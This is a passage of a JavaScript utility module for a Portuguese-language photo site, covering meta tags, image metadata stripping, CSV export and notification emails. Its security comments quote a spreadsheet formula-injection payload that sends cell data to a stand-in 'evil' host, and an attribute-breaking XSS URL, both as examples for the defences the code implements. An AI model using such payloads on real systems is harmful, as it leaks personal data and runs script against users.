// page while the redesign is fresh. Dismissal is remembered client-side
// (localStorage, same pattern as the cookie notice already on these pages) —
// each page wires its own show/hide script since inline <script> blocks
// aren't shared across pages, only this markup is.
export function updateBannerHTML() {
  return `
    <div class="update-banner" id="update-banner">
      <span>✨ Nova interface, melhorada!</span>
      <a href="/suporte?tema=bug">Encontrou um problema? Reportar</a>
      <a href="/suporte?tema=sugestao">💡 Tem uma sugestão?</a>
      <button type="button" class="ub-close" id="update-banner-close" aria-label="Fechar aviso">×</button>
    </div>`;
}

// ---------------------------------------------------------------------------
// Dicas de conexão para o Google Fonts — as DUAS, sempre juntas
// ---------------------------------------------------------------------------
// Inter vem de DOIS hosts: fonts.googleapis.com serve o CSS,
// fonts.gstatic.com serve os WOFF2 que o @font-face daquele CSS aponta. Sem
// preconnect aos dois, o browser só descobre o segundo host depois de baixar
// e parsear o CSS — handshake serial atrasado, visível como FOUT com
// display=swap (mais em rede móvel, onde o handshake dói mais).
//
// `crossorigin` no link do gstatic não é enfeite: fonte é buscada em modo
// CORS, e o browser usa pools de conexão separados para CORS/não-CORS — sem o
// atributo a conexão não é reaproveitada e o handshake repete. O link do CSS
// fica sem o atributo pelo motivo oposto (busca não-CORS).
//
// Remendo temporário — hospedar o Inter localmente (TODO.md) elimina os dois
// hosts de uma vez.
export function fontPreconnectHTML() {
  return `<link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>`;
}

// Host de onde sai TODA foto do site. A galeria abre dezenas de <img> daqui
// de uma vez (contra uma só na página de projeto), então é aqui que o
// preconnect importa mais. Sem `crossorigin`, ao contrário da fonte: <img>
// busca em modo não-CORS.
export function photoPreconnectHTML() {
  return '<link rel="preconnect" href="https://lh3.googleusercontent.com">';
}

// Beacon da Web Analytics da Cloudflare. Era a MESMA linha copiada na galeria e
// na página de projeto; virou função porque a correção abaixo precisava valer
// nas duas, e uma delas ficaria para trás — foi assim que o leitor de cookie de
// sessão divergiu.
//
// `escape()` além do `<`: o atributo é delimitado por ASPA SIMPLES e
// `JSON.stringify` não escapa `'`. Um token com apóstrofo fechava o atributo e
// o resto virava marcação. O token é secret do dono (CF_ANALYTICS_TOKEN), não
// entrada de visitante — mas um sink de HTML não deve depender de quem escreve
// o valor, e a função escapa uma vez para os dois chamadores.
/**
 * @param {string|null} token
 * @param {string} [nonce]
 */
export function analyticsBeaconHTML(token, nonce = '') {
  if (!token) return '';
  const cfg = JSON.stringify({ token: String(token) }).replace(/</g, '\\u003c');
  return `<script nonce="${escape(nonce)}" defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='${escape(cfg)}'></script>`;
}

// ---------------------------------------------------------------------------
// Cartão de pré-visualização do link (WhatsApp, Telegram, Instagram, Discord…)
// ---------------------------------------------------------------------------
// É por WhatsApp que um link de evento se espalha, e o que o destinatário vê
// antes de tocar é este cartão — não a página. Um bloco só, compartilhado por
// todas as páginas públicas, porque o conjunto de tags só funciona junto: em
// seis <head> separados eles divergiam (a página de projeto não tinha nem
// `<meta name="description">`; nenhuma tinha `og:site_name` ou dimensão de
// imagem).
//
// O que cada tag resolve, do ponto de vista do scraper:
//
//   og:image:width/height — decide entre o cartão GRANDE (foto no topo,
//     ocupando a largura da bolha) e a miniatura quadradinha ao lado do texto.
//     Sem as dimensões declaradas o WhatsApp precisa baixar a imagem para
//     medir, e quando o download é lento ou falha ele cai na miniatura. Por
//     isso `ogImageFor()` recorta em 1200×630 fixo: assim as dimensões são
//     CONHECIDAS na hora de renderizar o HTML, não um chute.
//   og:site_name/og:locale — a linha de origem do cartão e o idioma.
//   twitter:* — Twitter/X e o Discord ignoram parte das og: e leem estas.
//   name="description" — o mesmo texto serve ao resultado de busca; separar os
//     dois só criava a chance de um envelhecer sem o outro.
export const SITE_NAME = 'fotos · Luca F. Chala';

// 1200×630 (proporção 1.91:1) é o formato que Facebook, WhatsApp, LinkedIn e
// Telegram esperam do cartão grande. Também é o tamanho exato do PNG servido
// em /og-coming-soon.png, então a mesma constante serve aos dois casos.
export const OG_IMAGE_W = 1200;
export const OG_IMAGE_H = 630;

// Capa do evento no tamanho e no recorte do cartão. O `-c` do lh3 recorta em
// vez de encaixar (o scraper recortaria de qualquer jeito, mas aí sem saber
// as dimensões de antemão). URL que não é do lh3 volta intacta e sem
// dimensões — servir uma medida chutada é pior que omitir.
/**
 * @param {string|null|undefined} url
 * @returns {{ url: string, width: number, height: number }}
 */
export function ogImageFor(url) {
  const safe = safeUrl(url);
  if (!safe) return { url: '', width: 0, height: 0 };
  const m = safe.match(/^(https:\/\/lh3\.googleusercontent\.com\/d\/[\w-]+)(=.*)?$/);
  return m
    ? { url: `${m[1]}=w${OG_IMAGE_W}-h${OG_IMAGE_H}-c`, width: OG_IMAGE_W, height: OG_IMAGE_H }
    : { url: safe, width: 0, height: 0 };
}

// Corta no espaço, não no meio da palavra — o cartão é lido de relance, e
// "Formatura da turma de Engenh…" custa mais atenção que a frase inteira uma
// palavra mais curta. Volta ao corte seco se a última palavra for longa
// demais (senão uma URL colada na descrição comeria metade do limite).
/**
 * @param {unknown} str
 * @param {number} max
 */
export function truncateText(str, max) {
  const s = String(str ?? '').replace(/\s+/g, ' ').trim();
  if (max <= 1 || s.length <= max) return s.slice(0, Math.max(max, 0));
  const cut = s.slice(0, max - 1);
  const sp = cut.lastIndexOf(' ');
  const base = sp > max * 0.6 ? cut.slice(0, sp) : cut;
  return `${base.replace(/[\s.,;:—-]+$/, '')}…`;
}

// Descrição do cartão: os FATOS primeiro, o texto livre depois. O WhatsApp
// mostra cerca de duas linhas antes de cortar, então "15 de janeiro de 2026 ·
// Em colaboração com o Colégio X" precisa vir antes da descrição do projeto —
// invertido, o que sobra na tela é o começo de um parágrafo genérico.
/**
 * @param {(string|false|null|undefined)[]} facts
 * @param {string} [text]
 * @param {number} [max]
 */
export function previewDescription(facts, text = '', max = 200) {
  const head = facts.filter(Boolean).map(f => String(f).trim()).filter(Boolean).join(' · ');
  const rest = String(text || '').trim();
  if (!head) return truncateText(rest, max);
  // Menos de 40 caracteres sobrando não cabe frase — melhor a linha de fatos
  // limpa que um " — Fotografias fei…" pendurado nela.
  const room = max - head.length - 3;
  if (!rest || room < 40) return truncateText(head, max);
  return `${head} — ${truncateText(rest, room)}`;
}

// Bloco completo de meta tags do cartão. `image` sem `width`/`height` sai sem
// as dimensões e o cartão vira `summary` (miniatura) — o scraper decide, e
// prometer 1200×630 de uma imagem de tamanho desconhecido é pior que não
// prometer nada.
/**
 * @param {{
 *   title: string, description: string, url: string,
 *   type?: string, image?: string, imageAlt?: string,
 *   imageWidth?: number, imageHeight?: number,
 * }} meta
 */
export function socialMetaHTML({
  title, description, url, type = 'website',
  image = '', imageAlt = '', imageWidth = 0, imageHeight = 0,
}) {
  const desc = truncateText(description, 300);
  const big = !!image && imageWidth > 0 && imageHeight > 0;
  const alt = imageAlt || title;
  const imageTags = image
    ? `
  <meta property="og:image" content="${escape(image)}">
  <meta property="og:image:secure_url" content="${escape(image)}">${big ? `
  <meta property="og:image:width" content="${imageWidth}">
  <meta property="og:image:height" content="${imageHeight}">` : ''}
  <meta property="og:image:alt" content="${escape(alt)}">
  <meta name="twitter:image" content="${escape(image)}">
  <meta name="twitter:image:alt" content="${escape(alt)}">`
    : '';
  return `<meta name="description" content="${escape(desc)}">
  <meta property="og:site_name" content="${escape(SITE_NAME)}">
  <meta property="og:locale" content="pt_BR">
  <meta property="og:type" content="${escape(type)}">
  <meta property="og:title" content="${escape(title)}">
  <meta property="og:description" content="${escape(desc)}">
  <meta property="og:url" content="${escape(url)}">${imageTags}
  <meta name="twitter:card" content="${big ? 'summary_large_image' : 'summary'}">
  <meta name="twitter:title" content="${escape(title)}">
  <meta name="twitter:description" content="${escape(desc)}">`;
}

/**
 * @param {unknown} slug
 */
export function validateSlug(slug) {
  return typeof slug === 'string' && /^[a-z0-9][a-z0-9-]*[a-z0-9]$|^[a-z0-9]$/.test(slug) && slug.length <= 60;
}

export function generateId() {
  return Array.from(crypto.getRandomValues(new Uint8Array(16)))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');
}

/**
 * @param {string|null|undefined} dateStr
 * @returns {string}
 */
export function formatDatePT(dateStr) {
  if (!dateStr) return '';
  const parts = dateStr.split('-');
  if (parts.length !== 3) return dateStr;
  const [year, month, day] = parts;
  const months = [
    'janeiro', 'fevereiro', 'março', 'abril', 'maio', 'junho',
    'julho', 'agosto', 'setembro', 'outubro', 'novembro', 'dezembro',
  ];
  // Number.isInteger, e não só a faixa: `parseInt('ab', 10)` é NaN, e NaN
  // reprova as DUAS comparações (`NaN < 1` e `NaN > 12` são ambas falsas), então
  // a data malformada atravessava o portão e saía como "NaN de undefined de
  // 2026" na página do projeto. Comparação com NaN nunca é a guarda que parece.
  const m = parseInt(month, 10);
  const d = parseInt(day, 10);
  if (!Number.isInteger(m) || m < 1 || m > 12 || !Number.isInteger(d)) return dateStr;
  return `${d} de ${months[m - 1]} de ${year}`;
}

// Canonical event ordering: pinned first, then most recent by date
// (falling back to createdAt). Shared by the public gallery and the
// dashboard so the two never drift apart.
/**
 * @param {Evento} e
 */
export function eventTime(e) {
  return e.date ? new Date(e.date).getTime() : new Date(e.createdAt || 0).getTime();
}

/**
 * @param {Evento[]} events
 */
export function sortEvents(events) {
  return [...events].sort((a, b) => {
    if (a.pinned && !b.pinned) return -1;
    if (!a.pinned && b.pinned) return 1;
    return eventTime(b) - eventTime(a);
  });
}

// Request a resized variant of a Google-Drive-hosted thumbnail so the gallery
// grid loads small images instead of full-resolution originals. Non-Drive URLs
// (or URLs we don't recognise) are returned untouched. The original files in
// Drive are never altered.
/**
 * @param {string} url
 * @param {number} width
 */
export function sizedDriveThumb(url, width) {
  if (!url || typeof url !== 'string') return url || '';
  const m = url.match(/^(https:\/\/lh3\.googleusercontent\.com\/d\/[\w-]+)(=.*)?$/);
  return m ? `${m[1]}=w${width}` : url;
}

// Coerce a URL to https and reject script-executing schemes. href/src are
// script sinks — drop javascript:/data:/anything non-https.
/**
 * @param {unknown} url
 */
export function toHttps(url) {
  if (typeof url !== 'string') return ''; // was: threw on non-string (e.g. a number from a backup)
  const u = url.startsWith('http://') ? 'https://' + url.slice(7) : url;
  return /^https:\/\//i.test(u) ? u : '';
}

// Render-time guard for href/src values. toHttps() sanitizes on write, but
// stored data can predate that or bypass it (a restored backup merged
// verbatim), and escape() alone does NOT stop `javascript:` in an href — it
// only escapes the surrounding quotes.
//
// ATENÇÃO — allowlist de ESQUEMA, não escape de HTML: a URL crua pode conter
// aspas (`https://x/" onload="alert(1)`). Em atributo HTML componha as duas:
// escape(safeUrl(x)) — safeUrl mata `javascript:`, escape mata a quebra de
// atributo. Em atribuição de propriedade (el.href = x) safeUrl basta.
/**
 * @param {unknown} url
 */
export function safeUrl(url) {
  return toHttps(url);
}

// ---------------------------------------------------------------------------
// Remoção de metadados (EXIF/GPS/XMP) das imagens enviadas
// ---------------------------------------------------------------------------
// Foto de celular carrega GPS, modelo do aparelho, serial e data/hora no EXIF
// — o oposto do que alguém pedindo para SUMIR de uma foto quer entregar de
// brinde no e-mail ao admin (minimização, LGPD art. 6º, III).
//
// Limpeza no servidor, antes do anexo existir. Só JPEG/PNG/WebP: são os
// formatos onde dá para podar contêiner (dropar segmentos/chunks) sem
// recodificar o pixel. HEIC/AVIF/GIF passam intactos — o EXIF vive em caixas
// ISO-BMFF, e mexer sem decodificador de verdade arrisca corromper a prova.

// Segmentos JPEG que carregam metadado, não imagem:
// APP1 (EXIF/XMP), APP2 (ICC/FlashPix), APP13 (IPTC/Photoshop) e o comentário.
// APP0 (JFIF) fica: é o que define densidade/aspecto para alguns leitores.
const JPEG_STRIP_MARKERS = new Set([
  0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7, 0xE8,
  0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF, 0xFE,
]);

/**
 * @param {Uint8Array} bytes
 */
function stripJpeg(bytes) {
  // SOI, depois uma cadeia de segmentos `FF xx <len16> <payload>` até o SOS
  // (0xDA), a partir do qual vêm os dados comprimidos — que copiamos inteiros.
  if (bytes[0] !== 0xFF || bytes[1] !== 0xD8) return null;
  const out = [bytes.subarray(0, 2)];
  let i = 2;
  while (i + 3 < bytes.length) {
    if (bytes[i] !== 0xFF) return null; // fora de sincronia: não arrisque, devolva o original
    const marker = bytes[i + 1];
    if (marker === 0xD8 || marker === 0x01 || (marker >= 0xD0 && marker <= 0xD7)) { i += 2; continue; }
    if (marker === 0xDA) { out.push(bytes.subarray(i)); break; } // SOS + dados comprimidos até o fim
    const len = (bytes[i + 2] << 8) | bytes[i + 3];
    if (len < 2 || i + 2 + len > bytes.length) return null; // comprimento corrompido
    if (!JPEG_STRIP_MARKERS.has(marker)) out.push(bytes.subarray(i, i + 2 + len));
    i += 2 + len;
  }
  return concatBytes(out);
}

// Chunks PNG ancilares que guardam metadado ou texto arbitrário. As críticas
// (IHDR/PLTE/IDAT/IEND) e as de cor (gAMA/cHRM/sRGB/iCCP) ficam — sem elas a
// imagem muda de aparência ou nem abre.
const PNG_STRIP_CHUNKS = new Set(['eXIf', 'tEXt', 'iTXt', 'zTXt', 'tIME', 'dSIG']);

/**
 * @param {Uint8Array} bytes
 */
function stripPng(bytes) {
  const SIG = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A];
  for (let i = 0; i < SIG.length; i++) if (bytes[i] !== SIG[i]) return null;
  const out = [bytes.subarray(0, 8)];
  const view = new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength);
  let i = 8;
  while (i + 8 <= bytes.length) {
    const len = view.getUint32(i);
    const type = String.fromCharCode(bytes[i + 4], bytes[i + 5], bytes[i + 6], bytes[i + 7]);
    const total = 12 + len; // len + type(4) + data + crc(4)
    if (len > bytes.length || i + total > bytes.length) return null;
    if (!PNG_STRIP_CHUNKS.has(type)) out.push(bytes.subarray(i, i + total));
    i += total;
    if (type === 'IEND') break;
  }
  return concatBytes(out);
}

// WebP é RIFF: header de 12 bytes e uma sequência de chunks alinhados a 2.
// EXIF e XMP são chunks próprios, então some com eles e reescreva o tamanho
// declarado no header — que é o passo fácil de esquecer e que deixaria o
// arquivo inválido.
const WEBP_STRIP_CHUNKS = new Set(['EXIF', 'XMP ']);

/**
 * @param {Uint8Array} bytes
 */
function stripWebp(bytes) {
  /** @param {number} o */
  const tag = o => String.fromCharCode(bytes[o], bytes[o + 1], bytes[o + 2], bytes[o + 3]);
  if (tag(0) !== 'RIFF' || tag(8) !== 'WEBP') return null;
  const view = new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength);
  const body = [];
  let i = 12;
  while (i + 8 <= bytes.length) {
    const type = tag(i);
    const len = view.getUint32(i + 4, true); // RIFF é little-endian
    const padded = len + (len % 2); // chunk ímpar leva 1 byte de padding
    if (i + 8 + padded > bytes.length) return null;
    if (!WEBP_STRIP_CHUNKS.has(type)) body.push(bytes.subarray(i, i + 8 + padded));
    i += 8 + padded;
  }
  const bodyBytes = concatBytes(body);
  const header = new Uint8Array(12);
  header.set(bytes.subarray(0, 12));
  new DataView(header.buffer).setUint32(4, bodyBytes.length + 4, true); // 'WEBP' + corpo
  return concatBytes([header, bodyBytes]);
}

/**
 * @param {Uint8Array[]} chunks
 */
function concatBytes(chunks) {
  const total = chunks.reduce((n, c) => n + c.length, 0);
  const out = new Uint8Array(total);
  let at = 0;
  for (const c of chunks) { out.set(c, at); at += c.length; }
  return out;
}

/**
 * @param {string} b64
 */
export function bytesFromBase64(b64) {
  const bin = atob(b64);
  const out = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
  return out;
}

/**
 * @param {Uint8Array} bytes
 */
export function base64FromBytes(bytes) {
  // Em blocos: String.fromCharCode(...bytes) com 2 MB estoura o limite de
  // argumentos da engine.
  let bin = '';
  const CHUNK = 0x8000;
  for (let i = 0; i < bytes.length; i += CHUNK) {
    bin += String.fromCharCode(...bytes.subarray(i, i + CHUNK));
  }
  return btoa(bin);
}

// Devolve { base64, stripped, format }. Qualquer imprevisto devolve o
// original com stripped=false: perder o anexo do titular seria pior do que
// manter o metadado, e o resultado fica registrado para quem revisa o pedido.
/**
 * @param {string} b64
 */
export function stripImageMetadata(b64) {
  let bytes;
  try { bytes = bytesFromBase64(b64); } catch { return { base64: b64, stripped: false, format: 'unknown' }; }
  if (bytes.length < 12) return { base64: b64, stripped: false, format: 'unknown' };

  let format = 'unknown';
  /** @type {Uint8Array|null} */
  let cleaned = null;
  try {
    if (bytes[0] === 0xFF && bytes[1] === 0xD8) { format = 'jpeg'; cleaned = stripJpeg(bytes); }
    else if (bytes[0] === 0x89 && bytes[1] === 0x50) { format = 'png'; cleaned = stripPng(bytes); }
    else if (String.fromCharCode(bytes[0], bytes[1], bytes[2], bytes[3]) === 'RIFF') { format = 'webp'; cleaned = stripWebp(bytes); }
    // Reconhecidos mas não limpos — não os aceita (o chamador recusa todo
    // stripped:false), só deixa a recusa dizer "(heic)" em vez de "(unknown)".
    else if (String.fromCharCode(bytes[4], bytes[5], bytes[6], bytes[7]) === 'ftyp') {
      const marca = String.fromCharCode(...bytes.slice(8, 12)).toLowerCase();
      format = marca.startsWith('avif') ? 'avif' : 'heic';
    }
    else if (String.fromCharCode(bytes[0], bytes[1], bytes[2]) === 'GIF') { format = 'gif'; }
  } catch {
    cleaned = null;
  }

  if (!cleaned || cleaned.length === 0 || cleaned.length > bytes.length) {
    return { base64: b64, stripped: false, format };
  }
  try {
    return { base64: base64FromBytes(cleaned), stripped: true, format };
  } catch {
    return { base64: b64, stripped: false, format };
  }
}

// Sniff magic bytes from the start of a base64 payload to confirm it's an image
// (not an arbitrary blob smuggled through the removal-upload field).
/**
 * @param {string} b64
 */
export function isLikelyImage(b64) {
  let head;
  try { head = atob(b64.slice(0, 32)); } catch { return false; }
  /** @param {number} i */
  const byte = i => head.charCodeAt(i);
  if (byte(0) === 0xFF && byte(1) === 0xD8 && byte(2) === 0xFF) return true;                         // JPEG
  if (byte(0) === 0x89 && byte(1) === 0x50 && byte(2) === 0x4E && byte(3) === 0x47) return true;     // PNG
  if (head.slice(0, 4) === 'GIF8') return true;                                                      // GIF
  if (head.slice(0, 4) === 'RIFF' && head.slice(8, 12) === 'WEBP') return true;                      // WebP
  if (head.slice(4, 8) === 'ftyp' && /heic|heif|heix|hevc|mif1|avif/.test(head.slice(8, 20))) return true; // HEIC/AVIF
  return false;
}

// CSV export helpers (shared by the consent / removal / metrics exports).
//
// INJEÇÃO DE FÓRMULA — o motivo de este arquivo não ser trivial. Campos como
// `consenter_name`, `user_agent`, `referrer` vêm crus do visitante. Excel/
// Sheets tratam uma célula começando com `=`,`+`,`-`,`@`,TAB,CR como fórmula e
// executam ao abrir — ex.: `=HYPERLINK("https://evil/?x="&A1,"clique")`. Aspas
// de CSV não bloqueiam isso (são citação, não escape de fórmula); a execução
// roda no computador do admin, com os dados pessoais abertos na tela.
//
// Defesa: prefixar com apóstrofo, que a planilha lê como "isto é texto".
const CSV_FORMULA_PREFIX = /^[-=+@\t\r]/;

/**
 * @param {unknown} v
 */
export function csvCell(v) {
  if (v === null || v === undefined) return '';
  let s = String(v);
  // Caracteres de controle fora, antes de tudo — não são dado legítimo e dão
  // para forjar a estrutura do arquivo.
  // eslint-disable-next-line no-control-regex
  s = s.replace(/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]/g, '');
  if (CSV_FORMULA_PREFIX.test(s)) s = "'" + s;
  return /[",\n\r]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
}

/**
 * @param {string} filename
 * @param {string[]} cols
 * @param {Record<string, any>[]} rows
 */
export function csvResponse(filename, cols, rows) {
  const head = cols.map(csvCell).join(',');
  const lines = rows.map(r => cols.map(c => csvCell(r[c])).join(','));
  // Leading BOM so Excel opens UTF-8 (accents) correctly.
  const csv = '﻿' + [head, ...lines].join('\r\n') + '\r\n';
  return new Response(csv, {
    headers: {
      ...dataSecurityHeaders('text/csv; charset=utf-8'),
      // Nome vem de chamador interno, mas é interpolado num cabeçalho HTTP:
      // aspas e CR/LF fora, sempre, para que a origem do valor nunca precise
      // ser reauditada quando alguém acrescentar um export novo.
      'Content-Disposition': `attachment; filename="${String(filename).replace(/[^\w.-]/g, '_')}"`,
    },
  });
}


/**
 * @param {Env} env
 * @param {Pedido} req
 */
export async function sendRemovalEmail(env, req) {
  const apiKey = env.RESEND_API_KEY;
  if (!apiKey) return false;

  const methodLabel = /** @type {Record<string, string>} */ ({ number: 'Número da foto', url: 'Link da foto', upload: 'Arquivo enviado' })[req.method] || req.method;
  const esc = escape; // canonical 5-char escaper — never reintroduce the 3-char variant

  const html = `
<div style="font-family:sans-serif;max-width:520px;margin:0 auto;color:#1a1a1a">
  <h2 style="font-size:18px;margin-bottom:4px">🗑 Solicitação de remoção de foto</h2>
  <p style="color:#888;font-size:13px;margin-bottom:20px">Recebida via fotos.lucafchala.com</p>
  <table style="width:100%;border-collapse:collapse;font-size:14px">
    <tr><td style="padding:8px 0;color:#666;width:120px">Projeto</td><td style="padding:8px 0"><strong>${esc(req.eventTitle)}</strong> &nbsp;<span style="color:#aaa">/${esc(req.eventSlug)}</span></td></tr>
    <tr><td style="padding:8px 0;color:#666">Tipo</td><td style="padding:8px 0">${esc(methodLabel)}</td></tr>
    ${req.value ? `<tr><td style="padding:8px 0;color:#666">Identificação</td><td style="padding:8px 0">${esc(req.value)}</td></tr>` : ''}
    ${req.method === 'upload' ? `<tr><td style="padding:8px 0;color:#666">Arquivo</td><td style="padding:8px 0">${esc(req.fileName || 'em anexo')}</td></tr>` : ''}
    ${req.email ? `<tr><td style="padding:8px 0;color:#666">E-mail</td><td style="padding:8px 0">${esc(req.email)}</td></tr>` : ''}
    ${req.phone ? `<tr><td style="padding:8px 0;color:#666">Telefone</td><td style="padding:8px 0">${esc(req.phone)}</td></tr>` : ''}
    ${req.message ? `<tr><td style="padding:8px 0;color:#666;vertical-align:top">Mensagem</td><td style="padding:8px 0">${esc(req.message)}</td></tr>` : ''}
    <tr><td style="padding:8px 0;color:#666">Data</td><td style="padding:8px 0;color:#888;font-size:12px">${new Date(req.createdAt).toLocaleString('pt-BR')}</td></tr>
  </table>
  <p style="margin-top:24px;font-size:12px;color:#bbb">Gerencie as solicitações em fotos.lucafchala.com/dashboard</p>
</div>`;

  /** @type {{ from: string, to: (string|undefined)[], subject: string, html: string, attachments?: {filename: string, content: string}[] }} */
  const body = {
    from: 'Fotos <noreply@lucafchala.com>',
    to: [env.ADMIN_EMAIL],
    subject: `🗑 Remoção solicitada — ${req.eventTitle}`,
    html,
  };

  if (req.fileBase64 && req.fileName) {
    // O nome vem cru do formulário público e vira o filename do anexo MIME.
    // sanitizeFilename() tira travessia de caminho, CR/LF e dupla extensão —
    // ver o comentário em security.js para o que cada uma delas faria aqui.
    body.attachments = [{ filename: sanitizeFilename(req.fileName), content: req.fileBase64 }];
  }

  const res = await fetch('https://api.resend.com/emails', {
    method: 'POST',
    signal: AbortSignal.timeout(EMAIL_TIMEOUT_MS),
    headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  if (!res.ok) {
    const text = await res.text().catch(() => res.status);
    throw new Error(`Resend ${res.status}: ${text}`);
  }
  return true;
}

/**
 * @param {Env} env
 * @param {Pedido} req
 */
export async function sendResolvedEmail(env, req) {
  const apiKey = env.RESEND_API_KEY;
  if (!apiKey || !req.email) return false;

  const esc = escape; // canonical 5-char escaper — never reintroduce the 3-char variant

  const html = `
<div style="font-family:sans-serif;max-width:520px;margin:0 auto;color:#1a1a1a">
  <h2 style="font-size:18px;margin-bottom:4px">✓ Solicitação atendida</h2>
  <p style="color:#888;font-size:13px;margin-bottom:20px">fotos.lucafchala.com</p>
  <p style="font-size:14px;line-height:1.6;margin-bottom:16px">Olá! Sua solicitação de remoção de foto referente ao projeto <strong>${esc(req.eventTitle)}</strong> foi <strong>atendida</strong>.</p>
  ${req.value ? `<p style="font-size:14px;line-height:1.6;color:#444">Identificação: ${esc(req.value)}</p>` : ''}
  <p style="margin-top:24px;font-size:14px;line-height:1.6;color:#444">A foto foi removida do arquivo público. Obrigado por avisar!</p>
  <p style="margin-top:12px;font-size:13px;line-height:1.6;color:#666">Qualquer outra dúvida, fale comigo pelo <a href="https://wa.me/5511989211178" style="color:#888">WhatsApp</a> ou envie um e-mail para <a href="mailto:suporte@lucafchala.com" style="color:#888">suporte@lucafchala.com</a>.</p>
  <p style="margin-top:16px;font-size:12px;color:#bbb">Luca F. Chala · fotos.lucafchala.com</p>
</div>`;

  const res = await fetch('https://api.resend.com/emails', {
    method: 'POST',
    signal: AbortSignal.timeout(EMAIL_TIMEOUT_MS),
    headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({
      from: 'Fotos <noreply@lucafchala.com>',
      to: [req.email],
      subject: `Solicitação atendida — ${req.eventTitle}`,
      html,
    }),
  });
  if (!res.ok) {
    const text = await res.text().catch(() => res.status);
    throw new Error(`Resend ${res.status}: ${text}`);
  }
  return true;
}

/**
 * @param {Env} env
 * @param {{ name: string, email: string, message: string }} msg
 */
export async function sendSupportEmail(env, { name, email, message }) {
  const apiKey = env.RESEND_API_KEY;
  if (!apiKey) return false;

  const esc = escape; // canonical 5-char escaper — never reintroduce the 3-char variant

  const html = `
<div style="font-family:sans-serif;max-width:520px;margin:0 auto;color:#1a1a1a">
  <h2 style="font-size:18px;margin-bottom:4px">📬 Nova mensagem de suporte</h2>
  <p style="color:#888;font-size:13px;margin-bottom:20px">Recebida via fotos.lucafchala.com/suporte</p>
  <table style="width:100%;border-collapse:collapse;font-size:14px">
    ${name ? `<tr><td style="padding:8px 0;color:#666;width:80px">Nome</td><td style="padding:8px 0">${esc(name)}</td></tr>` : ''}
    ${email ? `<tr><td style="padding:8px 0;color:#666">E-mail</td><td style="padding:8px 0"><a href="mailto:${esc(email)}">${esc(email)}</a></td></tr>` : ''}
    <tr><td style="padding:8px 0;color:#666;vertical-align:top">Mensagem</td><td style="padding:8px 0;white-space:pre-wrap">${esc(message)}</td></tr>
    <tr><td style="padding:8px 0;color:#666">Data</td><td style="padding:8px 0;color:#888;font-size:12px">${new Date().toLocaleString('pt-BR')}</td></tr>
  </table>
</div>`;

  const res = await fetch('https://api.resend.com/emails', {
    method: 'POST',
    signal: AbortSignal.timeout(EMAIL_TIMEOUT_MS),
    headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({
      from: 'Fotos <noreply@lucafchala.com>',
      to: [env.ADMIN_EMAIL],
      reply_to: email || undefined,
      subject: `📬 Suporte${name ? ` — ${name.replace(/[\r\n]/g, ' ')}` : ''}`,
      html,
    }),
  });
  if (!res.ok) {
    const text = await res.text().catch(() => res.status);
    throw new Error(`Resend ${res.status}: ${text}`);
  }
  return true;
}

// Fire-and-forget alert when an unhandled exception reaches the top-level
// fetch() catch — a tripwire so an outage/bug is noticed without watching
// logs. Never throws (called via ctx.waitUntil(...).catch) and never includes
// request bodies/headers/IP — only error message, truncated stack, and route
// — to avoid ever mailing visitor PII. Global cooldown, not per-error.
/**
 * @param {Env} env
 * @param {unknown} err
 * @param {{ path?: string, method?: string, [k: string]: any }} [context]
 */
export async function sendErrorAlert(env, err, context = {}) {
  const apiKey = env.RESEND_API_KEY;
  if (!apiKey || !env.ADMIN_EMAIL) return false;
  try {
    const cooldownKey = 'error-alert:cooldown';
    if (await env.FOTOS.get(cooldownKey)) return false;
    await env.FOTOS.put(cooldownKey, '1', { expirationTtl: ERROR_ALERT_COOLDOWN_SECS });
  } catch { /* KV hiccup shouldn't block the alert or the response */ }

  const esc = escape;
  // `catch` entrega `unknown`; um narrow explícito é o que deixa ler .stack
  // sem fingir que todo throw é Error.
  const e = /** @type {{ message?: unknown, stack?: unknown }} */ (err ?? {});
  const message = e.message ? String(e.message) : String(err);
  const stack = e.stack ? String(e.stack).slice(0, 2000) : '';

  const html = `
<div style="font-family:sans-serif;max-width:520px;margin:0 auto;color:#1a1a1a">
  <h2 style="font-size:18px;margin-bottom:4px">🔴 Erro no site</h2>
  <p style="color:#888;font-size:13px;margin-bottom:20px">fotos.lucafchala.com — captado no catch-all do Worker</p>
  <table style="width:100%;border-collapse:collapse;font-size:14px">
    ${context.path ? `<tr><td style="padding:8px 0;color:#666;width:80px">Rota</td><td style="padding:8px 0">${esc(context.method || '')} ${esc(context.path)}</td></tr>` : ''}
    <tr><td style="padding:8px 0;color:#666;vertical-align:top">Mensagem</td><td style="padding:8px 0">${esc(message)}</td></tr>
    ${stack ? `<tr><td style="padding:8px 0;color:#666;vertical-align:top">Stack</td><td style="padding:8px 0;white-space:pre-wrap;font-family:monospace;font-size:11px;color:#555">${esc(stack)}</td></tr>` : ''}
    <tr><td style="padding:8px 0;color:#666">Data</td><td style="padding:8px 0;color:#888;font-size:12px">${new Date().toLocaleString('pt-BR')}</td></tr>
  </table>
  <p style="margin-top:20px;font-size:12px;color:#bbb">Próximos erros ficam em silêncio por ${Math.round(ERROR_ALERT_COOLDOWN_SECS / 60)} min para não lotar a caixa de entrada.</p>
</div>`;

  try {
    const res = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      signal: AbortSignal.timeout(EMAIL_TIMEOUT_MS),
      headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({
        from: 'Fotos <noreply@lucafchala.com>',
        to: [env.ADMIN_EMAIL],
        subject: `🔴 Erro no site${context.path ? ` — ${context.path}` : ''}`,
        html,
